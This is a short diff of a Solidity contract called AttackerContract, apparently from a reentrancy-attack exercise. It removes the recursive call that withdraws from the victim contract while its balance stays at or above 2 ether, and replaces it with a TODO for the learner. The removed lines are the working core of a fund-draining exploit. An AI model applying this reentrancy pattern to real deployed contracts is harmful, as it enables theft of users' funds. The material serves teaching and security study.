@@ -33,10 +33,7 @@ contract AttackerContract {
         console.log("attacker balance -> ", Strings.toString(address(this).balance));
         console.log("contract balance -> ", Strings.toString(address(target).balance));
         console.log("-------------------");
-        // Leave enough money to enable last withdrawal
-        if (address(target).balance >= 2 ether) {
-            target.withdraw();
-        }
+        // TODO: call the target/victim smart contract's withdraw method
     }
 
     // Attack function
